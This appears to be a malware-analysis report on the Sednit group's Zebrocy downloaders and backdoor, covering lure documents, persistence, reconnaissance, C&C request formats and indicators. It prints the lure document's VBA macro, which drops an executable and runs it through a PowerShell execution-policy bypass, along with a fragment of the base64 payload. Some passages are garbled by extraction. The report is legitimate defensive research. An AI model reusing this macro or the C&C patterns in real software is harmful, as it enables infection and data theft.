Kaspersky mentioned this component for\n\n the first time in 2017 in their APT trend report and recently wrote an article where they quickly\n\n described it under the name Zebrocy.\n\n This new component is a family of malware, comprising downloaders and backdoors written in\n\n Delphi and AutoIt. These components play the same role in the Sednit ecosystem as\n\n Seduploader — that of first-stage malware.\n\n Victims we have seen targeted by Zebrocy are located in Azerbaijan, Bosnia and Herzegovina,\n\n Egypt, Georgia, Iran, Kazakhstan, Korea, Kyrgyzstan, Russia, Saudi Arabia, Serbia, Switzerland,\n\n Tajikistan, Turkey, Turkmenistan, Ukraine, Uruguay and Zimbabwe. These targets include\n\n embassies, ministries of foreign affairs, and diplomats.\n\n\n-----\n\n##### p\n\n In this article we describe this family and how it can coexist with the older Seduploader\n\n reconnaissance tools. We will talk about some similarities to and differences from Downdelph\n\n at the end.\n\n\n-----\n\nFigure 1: The Sednit ecosystem\n\n\n##### Figure 1 shows the attack methods and active malware used by Sednit. Email attachments are\n\n the main entry point to the Sednit ecosystem. DealersChoice is still being used, as research from\n\n Palo Alto Network mentioned in this recent blogpost. Both Seduploader and Zebrocy are\n\n actively being delivered by the Sednit group through email attachments. Finally, after a\n\n reconnaissance phase, Xagent and Xtunnel are deployed on the targets deemed interesting by\n\n the operators.\n\n## Attack methods\n\n\n-----\n\n## Malicious documents\n\n##### Malicious documents used by Sednit download the first stage payload via Visual Basic for\n\n Applications (VBA), exploits or even using Dynamic Data Exchange (DDE).\n\n At the end of 2017, the Sednit group launched two campaigns delivering two different malicious\n\n documents. The first was named Syria – New Russia provocations.doc and the second\n\n named Note Letter Mary Christmas Card.doc.\n\n\n-----\n\nFigure 2: Zebrocy’s malicious documents\n\n\n##### Both malicious documents contain a VBA macro that creates a randomly-named file in %TEMP%.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n\n\n[...]\n\nSub AutoClose()\n\nOn Error Resume Next\n\nvAdd = \"\"\n\nFor I = 1 To 8\n\nvAdd = vAdd + Chr(97 + Rnd(20) * 25)\n\nNext\n\nvFileName = Environ(\"temp\") & \"\\\" + vAdd & \".e\" + \"x\" & \"e\"\n\nSaveNew vFileName, UserForm1.Label1.Caption\n\nApplication.Run \"XYZ\", vFileName, \"WScript.Shell\"\n\nEnd Sub\n\nPublic Function XYZ(vF, vW)\n\nvStr = \"powershell.exe -nop -Exec Bypass -Command Start-Process '\" + vF + \"';\"\n\nCall CreateObject(vW).Run(vStr, 0)\n\n\n-----\n\n34\n\n35\n\n36\n\n37\n\n\nTVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZXIgV2lu\n\n[...]\n\n\n##### Example of Visual Basic function and base64 encoded first stage from Syria – New Russia\n\n provocations.doc document.\n\n## Archives\n\n##### Some campaigns have used an archive to drop the first stage on the victim computer, rather\n\n than Office document macros. The archive is presumably delivered as an email attachment.\n\n All first stage of the Zebrocy family are executables with an icon and a document-like filename\n\n intended to trick the victim as shown in the Figure3.\n\n\n-----\n\n##### A Delphi downloader is the first stage of the Zebrocy family, although we have seen some\n\n campaigns from the Sednit group using the AutoIt stage directly without using this\n\n downloader. Most of these Delphi downloader binaries use Office document icons or other\n\n icons like Windows library, and sometimes these samples are packed with UPX. The purpose of\n\n this stage is quite straightforward: it retrieves a maximum of information from the victim’s\n\n computer.\n\n When the malware is launched, a splash window pops up with a bogus error message and the\n\n filename of the dropped binary. For example, if the filename is srsiymyw.exe, the filename\n\n that appears in the splash window will be srsiymyw.doc (see Figure 4). The pop-up’s purpose\n\n is to distract the user so that he won’t think anything unusual is happening on his computer.\n\n\n-----\n\nFigure 4: Delphi downloader splash window\n\n\n##### In fact, the downloader is busy creating a file under %TEMP% with a filename hardcoded in the\n\n binary (although at this stage, the file is empty). Persistence is implemented by adding a\n\n Windows registry entry under\n\n HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ with the path of the\n\n hardcoded filename.\n\n To gather information, the malware creates a new process using the Windows API\n\n CreateProcess function with cmd.exe /c SYSTEMINFO & TASKLIST as lpCommandLine\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n\nPOST (\\/[a-zA-Z0-9\\-\\_\\^\\.]*){3}\\.(php|dat)?fort=<SerialNumber_C> HTTP/1.0\n\nConnection: keep-alive\n\nContent-Type: application/x-www-form-urlencoded\n\nContent-Length: xxxx\n\nHost: <ip_address>\n\nAccept: text/html, */*\n\nAccept-Encoding: identity\n\nUser-Agent: Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\n\n\n\n[...]\n\n\npol=MM/DD/YYYY%20HH:MM:SS%20(AM|PM)%0D%0A<DriveListing>%0D%0A%0D%0A<Path_to_the_binary>%0D%0A%0D%\n\n\n##### Delphi downloader HTTP POST request\n\n Once the request has been sent, the C&C server responds by sending the next stage, if the target is\n\n considered interesting by the operator. The time elapsing between the sending of the report and the\n\n receipt of the payload is a few hours. This next stage is written into the file created earlier and\n\n\n-----\n\n##### The AutoIt downloader is another layer of the reconnaissance phase during an infection of the\n\n victim computer. From this point onwards, two scenarios are possible: in the first one, the\n\n Delphi downloader is the first stage and the second stage – which is the AutoIt downloader – is\n\n a lightweight downloader. In the other scenario, the AutoIt downloader is the first stage and it\n\n has all functionalities of the Delphi downloader and even more.\n\n When the AutoIt downloader is the first stage it performs many reconnaissance functions. Even\n\n if this one shares some similarities with the Delphi downloader, such as the persistence\n\n mechanism and the splash window, it adds more granularity to the reconnaissance phase than\n\n that of the Delphi downloader. Here is a non-exhaustive list of its capabilities:\n\nDetect sandbox and virtual environment\n\nGet list of installed software (via\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall)\n\nGet Windows version (32-bit or 64-bit)\n\nh li\n\n\n-----\n\nGet screenshot\n\nGet various information about the victim computer using Windows Management Instrumentation\n[(WMI) objects, probably inspired by code from this GitHub repository](https://github.com/cornernote/autoit-poker_bot/blob/master/includes/vendor/CompInfo/CompInfo.au3)\n\n##### Depending on the previous stage, the name of the AutoIt binary is different. If the malware is\n\n dropped as the first stage, it has a document-like name. Otherwise it is given the name\n\n hardcoded in the Delphi downloader, as shown in Table 1.\n\n\n-----\n\n##### y, p g g\n\n\nFirst Stage AutoIt binary Filenames\n\n##### csrsvc.exe\n\nDelphi downloader\n\n##### Protocol List_20160606.exe\n\nEmail attachment\n\n##### The purpose of this stage is more of less the same as the previous one. There are many\n\n different versions in the wild but all of them include at least the code to achieve the following:\n\nRetrieve the serial number of the hard drive C:\n\nUse network functions from winhttp dll or winhttp au3\n\n\n-----\n\n##### In the same way that the Delphi downloader has a splash window, the AutoIt also has a splash\n\n window when it comes from an email attachment – the AutoIt is the first stage. The splash screen is\n\n related to the binary icon. For example, an AutoIt downloader with Adobe Reader as an icon displays\n\n a splash screen saying that the PDF file the victim would be expecting to be displayed is corrupted. An\n\n AutoIt binary with a Word icon will display the following popup asking for a password. The password\n\n is not considered here; we think it’s just a way to distract the victim from the code’s real malicious\n\n activity.\n\n\nFigure 5: AutoIt downloader Word popup\n\n\n## Delphi backdoor\n\n\n-----\n\n##### Zebrocy downloading the Sednit group s flagship backdoor, Xagent, in the past.\n\n Unlike the previous components, this one has an internal version number that doesn’t seem to\n\n be related to a specific campaign. This version number has evolved over time, as shown in Table\n\n 2:\n\n\n##### Table 2: Delphi backdoor internal version history\n\n\nPE timestamp version\n\n2015-12-28 2.1\n\n2016-01-06 2.2\n\n2016-01-25 2.3\n\n2016-02-03 2.4\n\n2016-03-14 2.5\n\n\n-----\n\n##### p y\n\n2016-06-01 4.4\n\n2016-09-08 5.0\n\n\n2016-12-15 5.1\n\n2017-06-01 7.0\n\n2017-09-26 8.0\n\n2017-10-12 8.1\n\n2017-11-12 8.2\n\n2017-12-26 8.5\n\n2018-01-09 8.6\n\n2017-12-18 10.1\n\n2018-01-09 10.2\n\n2018-01-16 10.3\n\n\n-----\n\n##### p y\n\n2018-03-05 13.0\n\n2018-03-06 13.1\n\n\n2018-03-14 14.0\n\n2018-03-28 14.1\n\n##### Notice that we don’t have the full visibility and we may have missed some versions of the\n\n backdoor. Besides, there is some overlap between versions meaning that some older versions\n\n are still used at the same time as newer versions.\n\n In the next few paragraphs we will highlight some differences seen in the malware during its\n\n evolution.\n\n The backdoor embeds a block of configuration. The configuration values change from one\n\n sample to another, but the list of configurable items stays the same. However, the way in which\n\n the configuration data are stored in the malware sample has evolved over time.\n\n The first versions of the backdoor embedded the configuration data in plaintext, as shown in\n\n Figure 6\n\n\n-----\n\nFigure 6: Delphi backdoor plaintext configuration data\n\n\n##### Then, in later versions, the malware’s authors encoded the configuration data as hexadecimal strings,\n\n as shown in Figure 7.\n\n\n-----\n\nFigure 7: Delphi backdoor encoded configuration data\n\n\n##### In the latest versions, the configuration data is encrypted in the resources using the AES\n\n algorithm. Older versions stored it in the .text section.\n\n The configuration data contains:\n\nAES keys to communicate with the C&C server\n\nURLs with paths differing from one sample to another\n\nThe version of the malware\n\nThe windows registry key/value that ensures the persistence of the backdoor\n\n\n-----\n\nThe names of hidden directories to be created to store temporary files: the directory filenames are\nconcatenated with the environment variable (%APPDATA%)\n\n##### Once the malware is set up, it executes callback functions via the Windows API function\n\n SetTimer. These callbacks allow the operator to handle many features and commands of the\n\n backdoor.\n\nTake a screenshot of the Desktop of the victim\n\nCapture keystrokes\n\nList drives/network resources\n\nRead/write into Windows registry\n\nCopy/move/delete a file system object\n\nExecute files or create scheduled tasks\n\n##### The number of commands handled by the backdoor – about 30 – differs from one version to\n\n\n-----\n\n##### p y p y\n\n temporary files are stored in one of the hidden directories created during the set-up phase.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n\nPOST (\\/[a-zA-Z0-9\\-\\_\\^\\.]*){3}\\.(php|dat).

The contents sent to the C&C server vary from\n\n one command to another, but all contains at least the HDD serial number and the first four\n\n bytes of the computer name.\n\n For example, HELLO corresponds to the first packet sent by the backdoor to establish contact\n\n with the C&C server. As shown below it contains the date when the task was launched, the\n\n Delphi backdoor’s internal version number, the HDD serial number, the computer name (first\n\n four bytes), the command and the date when the backdoor was executed.\n\n Start: 1/4/2018 1:37:00 PM – [<vx.x>]:42424242ESET-HELLO-[2018-04-04 01\n 37-00]-315.TXT.\n\n The second AES key in the configuration data is used to decrypt the answer from the C&C\n\n server.\n\n Like Seduploader, this backdoor is used to deploy Xagent on victim machines apparently\n\n deemed “interesting” by the operators after the reconnaissance phase.\n\n## Summary\n\n\n-----\n\n##### language for Downdelph. However, even if this latest component has nothing else in common\n\n with Downdelph “technically speaking”, there are some points of interest worth mentioning.\n\nThe deployment methods are the same, both being delivered as an email attachment.\n\nWe saw Downdelph for the last time in September 2015, and the first sample of Zebrocy we saw in the\nwild was dated November 2015.\n\nBoth are written in Delphi.\n\n##### We can hypothesize that the Sednit group abandoned one component and started to develop\n\n a new one. One thing that doesn’t change for the group, however, are the mistakes they made:\n\nThe name of the scheduled task: Windiws\n\nThe function name that retrieves system information in the AutoIt downloader is _SOFWARE()\n\nMary instead of Merry in Note Letter Mary Christmas Card.doc\n\n##### Th b d b h D l hi b kd AES 256 k 38 b l i d f 32\n\n\n-----\n\n##### We have seen Zebrocy being heavily used by the Sednit group over the last two years. Our\n\n analysis of the many new variants that appeared on a regular basis since 2017 clearly indicates\n\n that Zebrocy is being actively maintained and improved by its author(s). We can consider it as\n\n one of the stable, mature tools in Sednit’s arsenal, a tool that deserves to be monitored closely.\n\n## IoCs\n\n##### Malicious documents\n\nSHA-1 ESET Detection name
